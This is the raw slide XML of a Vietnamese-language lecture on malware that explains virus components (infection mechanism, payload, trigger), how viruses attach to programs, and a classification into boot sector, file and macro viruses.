            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền lây nhiễm nội dung – Virus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="190936366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fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. M</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ã ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền lây nhiễm nội dung – Virus</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các thành phần của Virus:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Infection mechanism</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: Phần lây nhiễm, cho phép sự sao chép</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Payload:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Phần hoạt động của virus, gây hại hoặc vô hại</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Trigger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: Phần kích hoạt virus</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="349250" lvl="1" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Prepended</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> (thêm vào trước)/ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>postpended</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> (thêm vào sau)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>một chương trình thực hiện hoặc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>embedded</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> (nhúng) vào chương trình bằng một phương pháp nào đó.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="349250" lvl="1" algn="just">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K</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>chương trình bị nhiễm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>được</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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gọi, thực hiện mã virus sau đó </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>thực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hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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mã chương trìn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>h</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="349250" lvl="1" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Có thể ngăn chặn sự lây nhiễm ban đầu (khó khăn) hoặc sự lan truyền với xác thực và điều khiển truy cập</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="166451288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371600" y="304800"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền lây nhiễm nội dung – Virus</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 4"/>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l="11070" t="6863" r="33624" b="48733"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5257800" y="1508571"/>
            <a:ext cx="5390582" cy="4968429"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF">
                    <a:alpha val="70000"/>
                  </a:srgbClr>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AFCACEC5-FA4E-42C5-ABC9-6193C1425685}"/>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342900" indent="-342900" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
              <a:defRPr sz="2400" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="514350" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:defRPr sz="2000" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="857250" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1200150" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1543050" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Arial"/>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r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Cấu trúc Virus c</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="vi-VN" altLang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> bản</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="387123657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fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền lây nhiễm nội dung – Virus</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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9A2CF3C-0B4C-42CC-8067-E327EE533541}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Cấu trúc Virus</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect l="9265" t="5370" r="9265" b="60852"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5202238" y="1481878"/>
            <a:ext cx="6780937" cy="5071322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF">
                    <a:alpha val="70000"/>
                  </a:srgbClr>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect l="3580" t="13875" r="3580" b="32373"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="533400" y="2590800"/>
            <a:ext cx="4668838" cy="2090738"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF">
                    <a:alpha val="70000"/>
                  </a:srgbClr>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="335493968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828800" y="381000"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. M</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ã ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền lây nhiễm nội dung – Virus</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990600" y="1752600"/>
            <a:ext cx="8915400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Phân loại Virus</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="1">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altLang="en-US" sz="2400" b="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dựa trên mục tiêu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>boot sector infector</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="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lây nhiễm một bản ghi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>boot record </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>và lây lan khi hệ thống được khởi động từ đĩa có chứa virus.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>file infector</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" alt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lây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nhiễm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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các tệp tin mà hệ điều hành hoặc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> xem là có thể thực thi được.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>macro virus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="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lây nhiễm các tệp tin có </a:t>
            </a:r>
